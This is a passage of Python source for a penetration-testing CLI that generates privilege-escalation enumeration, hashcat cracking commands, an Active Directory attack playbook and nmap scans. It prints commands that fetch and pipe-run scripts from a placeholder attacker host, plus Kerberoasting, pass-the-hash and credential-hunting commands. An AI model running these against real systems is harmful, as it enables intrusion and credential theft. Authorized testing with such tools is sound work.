"""
Empusa - Operational Build Domain (cli_build)

Heavy operational functions: environment build & scan, nmap integration,
exploit search, reverse-tunnel builder, hashcat rule generator,
privesc enum, hash crack builder, AD playbook, and loot tracker.

Public API consumed by *cli.py*:

- **privesc_enum_generator()**
- **hash_crack_builder()**
- **ad_enum_playbook()**
- **validate_ip(ip)**
- **detect_os(nmap_output)**
- **search_exploits_from_nmap(nmap_file, …)**
- **run_nmap(ip, output_path, …)**
- **summarize_hosts(env_name)**
- **configure_shell_history(hist_file)**
- **build_env(env_name, ips, …)**
- **build_reverse_tunnel()**
- **generate_hashcat_rules()**
- **loot_tracker(…)**
"""

from __future__ import annotations

import ipaddress
import json
import os
import re
import subprocess
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import (
    TYPE_CHECKING,
    Any,
    Callable,
    Dict,
    List,
    Optional,
    Set,
    Tuple,
)

from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Confirm, Prompt
from rich.table import Table

from empusa.cli_common import (
    CONFIG,
    IS_UNIX,
    IS_WINDOWS,
    check_tool_exists,
    console,
    load_loot,
    log_error,
    log_info,
    log_success,
    log_verbose,
    render_screen,
    render_group_heading,
    sanitize_filename,
)

if TYPE_CHECKING:
    from empusa.services import Services


# ═══════════════════════════════════════════════════════════════════
#  Privesc Enumeration Generator
# ═══════════════════════════════════════════════════════════════════

WINDOWS_ENUM_COMMANDS: List[Tuple[str, str]] = [
    ("Identity", "whoami"),
    ("Privileges", "whoami /priv"),
    ("Groups", "whoami /groups"),
    ("System Info", "systeminfo"),
    ("Local Users", "Get-LocalUser"),
    ("Local Groups", "Get-LocalGroup"),
    ("Administrators", "Get-LocalGroupMember Administrators"),
    ("Network Config", "ipconfig /all"),
    ("Routing Table", "route print"),
    ("Active Connections", "netstat -ano"),
    ("Running Processes", "Get-Process"),
    ("Running Services", "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"),
    ("Installed Apps (64)", 'Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname'),
    ("Installed Apps (32)", 'Get-ItemProperty "HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*" | select displayname'),
    ("Scheduled Tasks", "schtasks /query /fo LIST /v"),
    ("Unquoted Svc Paths", 'wmic service get name,pathname | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\\""'),
    ("Writable Svc Bins", 'Get-CimInstance -ClassName win32_service | Where-Object {$_.State -like "Running"} | ForEach-Object { icacls $_.PathName.Trim(\'"\') 2>$null }'),
    ("Security Patches", 'Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }'),
    ("PowerShell History", "(Get-PSReadLineOption).HistorySavePath"),
    ("KeePass DBs", 'Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue'),
    ("Interesting Files", 'Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.conf,*.config -File -Recurse -ErrorAction SilentlyContinue'),
    ("SUID-like (icacls)", 'icacls "C:\\Program Files" /T /C 2>$null | findstr /i "(F) (M) (W)"'),
    ("Credential Guard", 'Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning'),
    ("Firewall Rules", "netsh advfirewall show allprofiles"),
]

LINUX_ENUM_COMMANDS: List[Tuple[str, str]] = [
    ("Identity", "id"),
    ("Hostname", "hostname"),
    ("OS Release", "cat /etc/os-release 2>/dev/null || cat /etc/issue"),
    ("Kernel", "uname -a"),
    ("Users", "cat /etc/passwd | grep -v nologin | grep -v false"),
    ("Sudo Perms", "sudo -l 2>/dev/null"),
    ("SUID Binaries", "find / -perm -u=s -type f 2>/dev/null"),
    ("SGID Binaries", "find / -perm -g=s -type f 2>/dev/null"),
    ("Capabilities", "/usr/sbin/getcap -r / 2>/dev/null"),
    ("Cron Jobs (user)", "crontab -l 2>/dev/null"),
    ("Cron Jobs (system)", "ls -la /etc/cron* 2>/dev/null; cat /etc/crontab 2>/dev/null"),
    ("Cron Logs", "grep 'CRON' /var/log/syslog 2>/dev/null | tail -20"),
    ("Network Interfaces", "ip a 2>/dev/null || ifconfig"),
    ("Routing Table", "route 2>/dev/null || routel 2>/dev/null || ip route"),
    ("Listening Ports", "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"),
    ("Running Processes", "ps aux --sort=-%cpu | head -30"),
    ("Installed Packages", "dpkg -l 2>/dev/null | tail -30 || rpm -qa 2>/dev/null | tail -30"),
    ("Writable Dirs", "find / -writable -type d 2>/dev/null | head -20"),
    ("Writable /etc/passwd", "ls -la /etc/passwd"),
    ("Mounts", "mount; cat /etc/fstab 2>/dev/null"),
    ("Block Devices", "lsblk 2>/dev/null"),
    ("Kernel Modules", "lsmod 2>/dev/null | head -20"),
    ("Env Variables", "env"),
    ("Shell History", "cat ~/.bash_history 2>/dev/null | tail -50"),
    ("SSH Keys", "find / -name id_rsa -o -name authorized_keys -o -name id_ed25519 2>/dev/null"),
    ("Interesting Files", "find / -name '*.conf' -o -name '*.bak' -o -name '*.old' -o -name '*.kdbx' -o -name '*.db' 2>/dev/null | head -20"),
    ("Firewall Rules", "cat /etc/iptables/rules.v4 2>/dev/null; iptables -L -n 2>/dev/null"),
    ("AppArmor Status", "aa-status 2>/dev/null"),
]


def privesc_enum_generator() -> None:
    """Interactive privilege escalation enumeration command generator."""
    render_screen("Privesc Enumeration Generator", "Generates ready-to-paste enumeration commands for privesc.")

    log_info("Target OS:")
    log_info("1. Windows")
    log_info("2. Linux")
    log_info("0. Back")

    os_choice = Prompt.ask("Select", choices=["0", "1", "2"])
    if os_choice == "0":
        return

    if os_choice == "1":
        commands = WINDOWS_ENUM_COMMANDS
        os_label = "Windows"
        auto_tools = [
            ("winPEAS", "iwr -uri http://<ATTACKER>/winPEASx64.exe -Outfile winPEAS.exe; .\\winPEAS.exe"),
            ("PowerUp", "iwr -uri http://<ATTACKER>/PowerUp.ps1 -Outfile PowerUp.ps1; . .\\PowerUp.ps1; Invoke-AllChecks"),
            ("Seatbelt", "iwr -uri http://<ATTACKER>/Seatbelt.exe -Outfile Seatbelt.exe; .\\Seatbelt.exe -group=all"),
        ]
    else:
        commands = LINUX_ENUM_COMMANDS
        os_label = "Linux"
        auto_tools = [
            ("linPEAS", "curl http://<ATTACKER>/linpeas.sh | sh"),
            ("LinEnum", "curl http://<ATTACKER>/LinEnum.sh | bash"),
            ("unix-privesc-check", "unix-privesc-check standard"),
        ]

    log_info(f"\n[bold]{os_label} Enumeration Commands[/bold]")
    log_info("-" * 60)

    # Output modes
    log_info("\nOutput format:")
    log_info("1. Print to screen (copy/paste)")
    log_info("2. Save to file")
    log_info("3. Both")

    fmt_choice = Prompt.ask("Select", choices=["1", "2", "3"], default="1")

    lines: List[str] = []
    lines.append(f"# === {os_label} Privilege Escalation Enumeration ===")
    lines.append(f"# Generated by Empusa - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")

    lines.append("# -- Manual Enumeration ----------------------------")
    for label, cmd in commands:
        lines.append(f"\n# --- {label} ---")
        lines.append(cmd)

    lines.append("\n\n# -- Automated Tools -------------------------------")
    lines.append("# Transfer these to the target and run:")
    for name, cmd in auto_tools:
        lines.append(f"\n# --- {name} ---")
        lines.append(cmd)

    lines.append("")

    full_output = "\n".join(lines)

    if fmt_choice in ("1", "3"):
        console.print("")
        for line in lines:
            if line.startswith("# ===") or line.startswith("# -- "):
                console.print(line, style="bold yellow")
            elif line.startswith("# ---"):
                console.print(line, style="bold cyan")
            elif line.startswith("#"):
                console.print(line, style="dim")
            else:
                console.print(line, style="green")

    if fmt_choice in ("2", "3"):
        env = CONFIG.get("session_env", "")
        default_name = f"{env}_privesc_{os_label.lower()}.sh" if env else f"privesc_{os_label.lower()}.sh"
        filename = Prompt.ask("Save as", default=default_name).strip()
        out_path = Path(filename) if env == "" else Path(env) / filename
        out_path.write_text(full_output + "\n", encoding="utf-8")
        log_success(f"[+] Saved: {out_path}")


# ═══════════════════════════════════════════════════════════════════
#  Hash Identifier + Crack Command Builder
# ═══════════════════════════════════════════════════════════════════

# (hashcat_mode, hash_name, example_pattern_or_prefix)
HASH_SIGNATURES: List[Tuple[int, str, str]] = [
    (0,     "MD5",                    r"^[a-f0-9]{32}$"),
    (100,   "SHA-1",                  r"^[a-f0-9]{40}$"),
    (1400,  "SHA-256",                r"^[a-f0-9]{64}$"),
    (1700,  "SHA-512",                r"^[a-f0-9]{128}$"),
    (1000,  "NTLM",                   r"^[a-f0-9]{32}$"),
    (3000,  "LM",                     r"^[a-f0-9]{32}$"),
    (5600,  "Net-NTLMv2",             r"^\w+::\w+:"),
    (5500,  "Net-NTLMv1",             r"^\w+::\w+:"),
    (13100, "Kerberoast (TGS-REP)",   r"^\$krb5tgs\$"),
    (18200, "AS-REP Roast",           r"^\$krb5asrep\$"),
    (13400, "KeePass",                r"^\$keepass\$"),
    (22921, "SSH Key (RSA/DSA)",      r"^\$sshng\$"),
    (1800,  "sha512crypt ($6$)",      r"^\$6\$"),
    (500,   "md5crypt ($1$)",         r"^\$1\$"),
    (3200,  "bcrypt ($2)",            r"^\$2[aby]?\$"),
    (1500,  "DES crypt",             r"^[a-zA-Z0-9./]{13}$"),
    (7400,  "sha256crypt ($5$)",      r"^\$5\$"),
    (11600, "7-Zip",                  r"^\$7z\$"),
    (13000, "RAR5",                   r"^\$rar5\$"),
    (9600,  "MS Office 2013+",        r"^\$office\$\*2013"),
    (9500,  "MS Office 2010",         r"^\$office\$\*2010"),
    (9400,  "MS Office 2007",         r"^\$office\$\*2007"),
    (16800, "WPA-PMKID-PBKDF2",      r"^[a-f0-9]{32}\*[a-f0-9]+\*"),
    (2500,  "WPA-EAPOL-PBKDF2",      r"^WPA\*"),
    (11300, "Bitcoin/Litecoin wallet", r"^\$bitcoin\$"),
    (400,   "WordPress (phpass)",     r"^\$P\$"),
    (7900,  "Drupal7",               r"^\$S\$"),
]


def identify_hash(hash_str: str) -> List[Tuple[int, str]]:
    """Public wrapper for :func:`_identify_hash`."""
    return _identify_hash(hash_str)


def _identify_hash(hash_str: str) -> List[Tuple[int, str]]:
    """Identify possible hash types by matching against known patterns.

    Returns:
        List of (hashcat_mode, hash_name) tuples, most specific first.
    """
    hash_str = hash_str.strip()
    matches: List[Tuple[int, str]] = []

    # Prefix-based matches first (most reliable)
    prefix_checks: List[Tuple[int, str, str]] = [
        (m, n, p) for m, n, p in HASH_SIGNATURES
        if p.startswith(r"^\$") or p.startswith(r"^\w+::")
    ]
    for mode, name, pattern in prefix_checks:
        if re.match(pattern, hash_str, re.IGNORECASE):
            matches.append((mode, name))

    # Length-based matches (less specific - MD5 vs NTLM are both 32 hex)
    if not matches:
        length_checks: List[Tuple[int, str, str]] = [
            (m, n, p) for m, n, p in HASH_SIGNATURES
            if not p.startswith(r"^\$") and not p.startswith(r"^\w+::")
        ]
        for mode, name, pattern in length_checks:
            if re.match(pattern, hash_str, re.IGNORECASE):
                matches.append((mode, name))

    return matches


def hash_crack_builder() -> None:
    """Interactive hash identifier and hashcat command builder."""
    render_screen("Hash Identifier + Crack Command Builder", "Paste a hash to identify it and generate the hashcat command.")

    hash_input = Prompt.ask("Enter hash (or 'q' to quit)").strip()
    if hash_input.lower() == "q":
        return

    matches = _identify_hash(hash_input)

    if not matches:
        log_error("Could not identify hash type.")
        log_info("Try: https://hashcat.net/wiki/doku.php?id=example_hashes", "yellow")
        return

    # Show matches
    table = Table(
        title="Possible Hash Types",
        show_lines=True,
        border_style="green",
        title_style="bold green",
    )
    table.add_column("#", style="dim", width=3)
    table.add_column("Hash Type", style="bold white")
    table.add_column("Hashcat Mode", style="cyan")

    for i, (mode, name) in enumerate(matches, 1):
        table.add_row(str(i), name, str(mode))

    console.print(table)

    # Let user pick if ambiguous
    if len(matches) > 1:
        log_info("\nMultiple matches found. Which type?")
        try:
            idx = int(Prompt.ask("Select #", default="1")) - 1
            if not (0 <= idx < len(matches)):
                idx = 0
        except ValueError:
            idx = 0
        selected_mode, selected_name = matches[idx]
    else:
        selected_mode, selected_name = matches[0]

    log_info(f"\n[bold]Identified:[/bold] {selected_name} (hashcat -m {selected_mode})")

    # Build hashcat command
    log_info("\n[bold]Wordlist options:[/bold]")
    wordlists = [
        ("/usr/share/wordlists/rockyou.txt", "rockyou.txt (default)"),
        ("/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt", "rockyou-75 (fast)"),
        ("custom", "Enter custom path"),
    ]
    for i, (_, label) in enumerate(wordlists, 1):
        log_info(f"  {i}. {label}")

    wl_choice = Prompt.ask("Select", choices=["1", "2", "3"], default="1")
    if wl_choice == "3":
        wordlist = Prompt.ask("Wordlist path").strip()
    else:
        wordlist = wordlists[int(wl_choice) - 1][0]

    log_info("\n[bold]Rule file options:[/bold]")
    rules = [
        ("", "None"),
        ("/usr/share/hashcat/rules/best64.rule", "best64.rule"),
        ("/usr/share/hashcat/rules/rockyou-30000.rule", "rockyou-30000.rule"),
        ("/usr/share/hashcat/rules/d3ad0ne.rule", "d3ad0ne.rule"),
        ("custom", "Enter custom path"),
    ]
    for i, (_, label) in enumerate(rules, 1):
        log_info(f"  {i}. {label}")

    rule_choice = Prompt.ask("Select", choices=["1", "2", "3", "4", "5"], default="2")
    if rule_choice == "5":
        rule_path = Prompt.ask("Rule file path").strip()
    else:
        rule_path = rules[int(rule_choice) - 1][0]

    # Save hash to file
    hash_file = "hash.txt"
    env = CONFIG.get("session_env", "")
    if env:
        hash_file = f"{env}/hash_{selected_name.lower().replace(' ', '_').replace('-', '_')}.txt"

    # Build the command
    cmd = f"hashcat -m {selected_mode} {hash_file} {wordlist}"
    if rule_path:
        cmd += f" -r {rule_path}"
    cmd += " --force"

    console.print("")
    console.print(Panel(
        f"[bold green]# {selected_name} (mode {selected_mode})[/bold green]\n"
        f"[dim]# Save your hash first:[/dim]\n"
        f"echo '{hash_input}' > {hash_file}\n\n"
        f"[bold white]{cmd}[/bold white]\n\n"
        f"[dim]# Show cracked:[/dim]\n"
        f"hashcat -m {selected_mode} {hash_file} --show",
        title="Hashcat Command",
        border_style="green",
    ))

    # Offer to save
    if Confirm.ask("\nSave command to file?", default=False):
        out_name = f"crack_{selected_name.lower().replace(' ', '_')}.sh"
        out_path = Path(env) / out_name if env else Path(out_name)
        script = (
            "#!/bin/bash\n"
            f"# Hash Crack Script - {selected_name}\n"
            f"# Generated by Empusa - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"echo '{hash_input}' > {hash_file}\n"
            f"{cmd}\n"
            f"echo '\\n[*] Show results:'\n"
            f"hashcat -m {selected_mode} {hash_file} --show\n"
        )
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(script, encoding="utf-8")
        log_success(f"[+] Saved: {out_path}")


# ═══════════════════════════════════════════════════════════════════
#  AD Enumeration Playbook
# ═══════════════════════════════════════════════════════════════════

def ad_enum_playbook() -> None:
    """Generate pre-filled Active Directory enumeration commands."""
    render_screen("AD Enumeration Playbook", "Generates ready-to-paste AD enumeration commands.")

    domain = Prompt.ask("Domain name (e.g., corp.com)").strip()
    if not domain:
        log_error("Domain name required.")
        return

    username = Prompt.ask("Domain username (e.g., stephanie)").strip()
    dc_ip = Prompt.ask("Domain Controller IP (if known, or leave blank)").strip()

    # Derive distinguished name
    dn = ",".join(f"DC={part}" for part in domain.split("."))

    sections: List[str] = []
    sections.append(f"# === Active Directory Enumeration Playbook ===")
    sections.append(f"# Domain: {domain}  |  User: {username}  |  DC: {dc_ip or 'auto'}")
    sections.append(f"# Generated by Empusa - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    sections.append("")

    # -- RDP / Initial Access
    sections.append("# -- Initial Access ---------------------------------")
    if dc_ip:
        sections.append(f'xfreerdp /u:{username} /d:{domain} /v:{dc_ip}')
    sections.append("")

    # -- net.exe
    sections.append("# -- net.exe Enumeration ----------------------------")
    sections.append("net user /domain")
    sections.append("net group /domain")
    sections.append('net group "Domain Admins" /domain')
    sections.append('net group "Domain Controllers" /domain')
    sections.append('net group "Domain Computers" /domain')
    sections.append(f"net user {username} /domain")
    sections.append("")

    # -- PowerView
    sections.append("# -- PowerView --------------------------------------")
    sections.append("# Transfer: iwr -uri http://<ATTACKER>/PowerView.ps1 -OutFile PowerView.ps1")
    sections.append("powershell -ep bypass")
    sections.append("Import-Module .\\PowerView.ps1")
    sections.append("")
    sections.append("Get-NetDomain")
    sections.append("Get-NetUser | select cn,pwdlastset,lastlogon")
    sections.append("Get-NetUser | select cn,memberof")
    sections.append("Get-NetGroup | select cn")
    sections.append('Get-NetGroup "Domain Admins" | select member')
    sections.append("Get-NetComputer | select cn,operatingsystem")
    sections.append("Get-NetComputer | select cn,operatingsystem,dnshostname")
    sections.append("Find-LocalAdminAccess")
    sections.append("Get-NetSession -ComputerName dc01 -Verbose")
    sections.append("Get-DomainUser -SPN | select samaccountname,serviceprincipalname")
    sections.append("Get-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteOwner|WriteDACL'}")
    sections.append("")

    # -- LDAP Script
    sections.append("# -- LDAP PowerShell Script -------------------------")
    sections.append(f'$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name')
    sections.append(f'$DN  = "{dn}"')
    sections.append(f'$LDAP = "LDAP://$PDC/$DN"')
    sections.append("")
    sections.append("$dirEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)")
    sections.append("$searcher = New-Object System.DirectoryServices.DirectorySearcher($dirEntry)")
    sections.append("")
    sections.append("# All domain users")
    sections.append('$searcher.Filter = "(&(objectCategory=person)(objectClass=user))"')
    sections.append("$searcher.FindAll() | ForEach-Object { $_.Properties['samaccountname'] }")
    sections.append("")
    sections.append("# All domain groups")
    sections.append('$searcher.Filter = "(objectCategory=group)"')
    sections.append("$searcher.FindAll() | ForEach-Object { $_.Properties['cn'] }")
    sections.append("")
    sections.append("# Domain Admins members (catches nested groups)")
    sections.append('$searcher.Filter = "(&(objectCategory=group)(cn=Domain Admins))"')
    sections.append("$searcher.FindAll() | ForEach-Object { $_.Properties['member'] }")
    sections.append("")

    # -- SharpHound + BloodHound
    sections.append("# -- SharpHound / BloodHound ----------------------")
    sections.append("# Transfer: iwr -uri http://<ATTACKER>/Sharphound.ps1 -OutFile Sharphound.ps1")
    sections.append("Import-Module .\\Sharphound.ps1")
    sections.append('Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\' + username + '\\Desktop\\ -OutputPrefix "audit"')
    sections.append("")
    sections.append("# On Kali:")
    sections.append("sudo neo4j start")
    sections.append("# Browse: http://localhost:7474  (neo4j / neo4j)")
    sections.append("bloodhound")
    sections.append("# Drag & drop the ZIP → 'Find Shortest Paths to Domain Admins'")
    sections.append("")

    # -- Kali Remote Tools
    sections.append("# -- Remote Enumeration (from Kali) ---------------")
    if dc_ip:
        sections.append(f"nxc smb {dc_ip} -u '{username}' -p '<password>' --users")
        sections.append(f"nxc smb {dc_ip} -u '{username}' -p '<password>' --groups")
        sections.append(f"nxc smb {dc_ip} -u '{username}' -p '<password>' --shares")
        sections.append(f"nxc smb {dc_ip} -u '{username}' -p '<password>' --pass-pol")
        sections.append(f"nxc ldap {dc_ip} -u '{username}' -p '<password>' --kdcHost {dc_ip} --asreproast asrep.txt")
        sections.append(f"nxc ldap {dc_ip} -u '{username}' -p '<password>' --kdcHost {dc_ip} --kerberoast kerb.txt")
        sections.append(f"impacket-GetUserSPNs {domain}/{username}:<password> -dc-ip {dc_ip}")
        sections.append(f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt")
        sections.append(f"evil-winrm -i {dc_ip} -u {username} -p '<password>'")
        sections.append(f"impacket-psexec {domain}/{username}:'<password>'@{dc_ip}")
    else:
        sections.append("# Fill in DC_IP first, then:")
        sections.append(f"nxc smb <DC_IP> -u '{username}' -p '<password>' --users")
        sections.append(f"nxc smb <DC_IP> -u '{username}' -p '<password>' --shares")
        sections.append(f"impacket-GetUserSPNs {domain}/{username}:<password> -dc-ip <DC_IP>")
    sections.append("")

    # -- Attacks
    sections.append("# -- Common AD Attacks -----------------------------")
    sections.append("# Kerberoasting:")
    if dc_ip:
        sections.append(f"impacket-GetUserSPNs {domain}/{username}:<password> -dc-ip {dc_ip} -request -outputfile kerb_hashes.txt")
    sections.append("hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force")
    sections.append("")
    sections.append("# AS-REP Roasting:")
    if dc_ip:
        sections.append(f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile users.txt -outputfile asrep_hashes.txt")
    sections.append("hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force")
    sections.append("")
    sections.append("# Pass-the-Hash:")
    if dc_ip:
        sections.append(f"impacket-psexec -hashes 00000000000000000000000000000000:<NTLM> Administrator@{dc_ip}")
        sections.append(f"evil-winrm -i {dc_ip} -u Administrator -H '<NTLM>'")
    sections.append("")

    full_output = "\n".join(sections)

    # Print to screen
    console.print("")
    for line in sections:
        if line.startswith("# ===") or line.startswith("# -- "):
            console.print(line, style="bold blue")
        elif line.startswith("#"):
            console.print(line, style="dim")
        else:
            console.print(line, style="green")

    # Offer to save
    if Confirm.ask("\nSave playbook to file?", default=True):
        env = CONFIG.get("session_env", "")
        default_name = f"ad_playbook_{domain.replace('.', '_')}.sh"
        out_path = Path(env) / default_name if env else Path(default_name)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(full_output + "\n", encoding="utf-8")
        log_success(f"[+] Saved: {out_path}")


# ═══════════════════════════════════════════════════════════════════
#  IP / Port / Hostname validation
# ═══════════════════════════════════════════════════════════════════

def validate_ip(ip: str) -> bool:
    """Validate if string is a valid IP address."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def validate_port(port_str: str) -> bool:
    """Validate if string is a valid port number (1-65535)."""
    try:
        port = int(port_str)
        return 1 <= port <= 65535
    except ValueError:
        return False


def validate_hostname(hostname: str) -> bool:
    """Validate if string is a valid IP or hostname."""
    if validate_ip(hostname):
        return True
    if re.match(
        r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?'
        r'(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$',
        hostname,
    ):
        return True
    return False


# ═══════════════════════════════════════════════════════════════════
#  OS detection & Nmap integration
# ═══════════════════════════════════════════════════════════════════

def detect_os(nmap_output: Path) -> str:
    """Detect OS from nmap output file.

    Returns:
        "Windows", "Linux", or "Unknown"
    """
    nmap_path = Path(nmap_output)
    if not nmap_path.exists():
        log_verbose(f"Warning: {nmap_output} not found for OS detection", "yellow")
        return "Unknown"

    try:
        content = nmap_path.read_text(errors='ignore').lower()
        if "microsoft" in content or "windows" in content:
            return "Windows"
        elif any(x in content for x in ["linux", "unix", "ubuntu", "debian", "centos", "apache"]):
            return "Linux"
        else:
            return "Unknown"
    except Exception as e:
        log_verbose(f"Warning: Could not read {nmap_output}: {e}", "yellow")
        return "Unknown"


def search_exploits_from_nmap(
    nmap_file: Path,
    *,
    services: Optional["Services"] = None,
) -> None:
    """Parse nmap results and search for exploits using searchsploit."""
    nmap_path = Path(nmap_file)
    if not nmap_path.exists():
        log_error(f"Nmap file not found: {nmap_file}")
        return

    if not check_tool_exists("searchsploit"):
        log_error("Error: searchsploit not found on PATH.")
        log_info("Install exploit-db or skip this step.", "yellow")
        return

    if CONFIG['dry_run']:
        log_info("[DRY RUN] Would search exploits from nmap results", "yellow")
        return

    log_info(f"[*] Parsing services from {nmap_file} and searching exploits...")

    try:
        lines = nmap_path.read_text(errors='ignore').splitlines()
    except Exception as e:
        console.print(f"[red]Error reading file: {e}[/red]")
        return

    found_terms: Set[str] = set()
    service_regex = re.compile(r'(\d+)/(tcp|udp)\s+open\s+([\w\-]+)(\s+([\w\-\.]+))?')

    for line in lines:
        match = service_regex.search(line)
        if match:
            service = match.group(3)
            version = match.group(5) if match.group(5) else ""
            query = f"{service} {version}".strip()
            found_terms.add(query)

    exploit_log = nmap_path.parent / "searchsploit_results.md"

    try:
        with exploit_log.open("w") as out:
            out.write(f"# Exploit Search Results\n")
            out.write(f"Generated: {datetime.now().isoformat()}\n\n")

            for term in sorted(found_terms):
                log_info(f"\n>> searchsploit {term}", "bold yellow")
                out.write(f"## Exploits for: {term}\n")
                try:
                    if services is not None:
                        result = services.runner.run(
                            ["searchsploit", term], timeout=30,
                        )
                    else:
                        result = subprocess.run(
                            ["searchsploit", term],
                            capture_output=True, text=True,
                            check=False, timeout=30,
                        )
                    if not CONFIG['quiet']:
                        console.print(result.stdout)
                    out.write(f"```\n{result.stdout}\n```\n\n")
                except subprocess.TimeoutExpired:
                    msg = "searchsploit timed out\n"
                    log_verbose(msg, "yellow")
                    out.write(msg + "\n")
                except Exception as e:
                    msg = f"Error running searchsploit: {e}\n"
                    log_verbose(msg, "yellow")
                    out.write(msg + "\n")

        log_success(f"[+] Saved exploit suggestions to: {exploit_log}")
    except Exception as e:
        log_error(f"Error writing exploit log: {e}")


def run_nmap(
    ip: str,
    output_path: Path,
    *,
    run_hooks_fn: Optional[Callable[..., Any]] = None,
) -> Tuple[str, Path]:
    """Run nmap scan against target IP.

    Returns:
        Tuple of (ip, output_file_path)
    """
    output_path = Path(output_path)
    output_path.mkdir(parents=True, exist_ok=True)
    output_file = output_path / "full_scan.txt"
    greppable = output_path / "ports_grep.txt"

    if not check_tool_exists("nmap"):
        log_error("Error: nmap not found on PATH.")
        log_info("Install nmap before running scans.", "yellow")
        return ip, output_file

    if CONFIG['dry_run']:
        log_info(f"[DRY RUN] Would scan {ip}", "yellow")
        return ip, output_file

    def _run_nmap_cmd(cmd: List[str]) -> subprocess.CompletedProcess[bytes]:
        """Run nmap command with error handling."""
        try:
            return subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=600,  # 10 minute timeout
            )
        except subprocess.TimeoutExpired:
            log_verbose(f"Warning: Nmap scan timed out for {ip}", "yellow")
            return subprocess.CompletedProcess(cmd, 1, b"", b"Timeout")
        except Exception as e:
            log_error(f"Error running nmap: {e}")
            return subprocess.CompletedProcess(cmd, 1, b"", str(e).encode())

    def _parse_greppable(path: Path) -> List[str]:
        """Parse greppable nmap output for open ports."""
        ports: Set[str] = set()
        rx = re.compile(r'(\d+)/open/(?:tcp|udp)', re.IGNORECASE)

        if not path.exists():
            return []

        try:
            for line in path.read_text(errors="ignore").splitlines():
                if "Ports:" not in line:
                    continue
                for m in rx.finditer(line):
                    ports.add(m.group(1))
        except Exception as e:
            log_verbose(f"Warning: Could not parse {path}: {e}", "yellow")

        return sorted(ports, key=int)

    if run_hooks_fn is not None:
        run_hooks_fn("pre_scan_host", {
            "ip": ip,
            "env_name": CONFIG.get('session_env', ''),
        })

    log_info(f"[*] Scanning (fast discovery) on {ip}...")

    disc_cmd = [
        "nmap", "-n", "-T4", "-Pn", "-A",
        ip, "-oG", str(greppable),
    ]
    _run_nmap_cmd(disc_cmd)
    open_ports = _parse_greppable(greppable)

    if not open_ports:
        log_verbose("No ports found, retrying discovery with higher retries…", "yellow")
        disc_cmd_retry = [
            "nmap", "-n", "-T5", "-Pn", "-p-",
            "--max-rtt-timeout", "1000ms",
            "-sS",
            ip, "-oG", str(greppable),
        ]
        _run_nmap_cmd(disc_cmd_retry)
        open_ports = _parse_greppable(greppable)

    if not open_ports:
        log_verbose("Discovery still empty. Falling back to -A (full) so you get results.", "red")
        _run_nmap_cmd(["nmap", "-A", "-T5", "-Pn", "-p-", ip, "-oN", str(output_file)])
    else:
        ports_csv = ",".join(open_ports)
        log_info(f"[*] Enriching {ip} (ports: {ports_csv})...")
        enrich_cmd = [
            "nmap", "-n", "-T4", "-Pn",
            "-sV", "--version-light",
            "--script-timeout", "5s",
            "-p", ports_csv,
            ip, "-oN", str(output_file),
        ]
        _run_nmap_cmd(enrich_cmd)

    ports_dir = output_path / "ports"
    ports_dir.mkdir(exist_ok=True)
    environment = output_path.parent.parent.name

    nmap_line = re.compile(r'(\d+)/(tcp|udp)\s+open\s+([\w\-\._]+)(\s+(.*))?')

    if not output_file.exists():
        log_verbose(f"Warning: {output_file} not created", "yellow")
        return ip, output_file

    try:
        file_lines = output_file.read_text(errors='ignore').splitlines()
    except Exception as e:
        log_verbose(f"Warning: Could not read {output_file}: {e}", "yellow")
        return ip, output_file

    for line in file_lines:
        match = nmap_line.search(line)
        if not match:
            continue
        port = match.group(1)
        proto = match.group(2)
        service = sanitize_filename(match.group(3).lower())
        version_info = match.group(5) if match.group(5) else ""

        filename = f"{port}-{service}.txt"
        port_file_path = ports_dir / filename

        try:
            with port_file_path.open('w') as pf:
                pf.write(f"# Environment: {environment}\n")
                pf.write(f"# Host: {ip}\n")
                pf.write(f"# Port: {port}/{proto}\n")
                pf.write(f"# Service: {service}\n")
                if version_info:
                    pf.write(f"# Version: {version_info}\n")
                pf.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
                pf.write(line.strip() + "\n")
                pf.write("\n# === Suggested Next Steps ===\n")
                if service in ["http", "https"]:
                    pf.write("# - Run dirsearch or gobuster for content discovery\n")
                    pf.write("# - Scan with Nikto, Nuclei, or Wapiti for vulnerabilities\n")
                    pf.write("# - Loot: robots.txt, config files, login panels, backups\n")
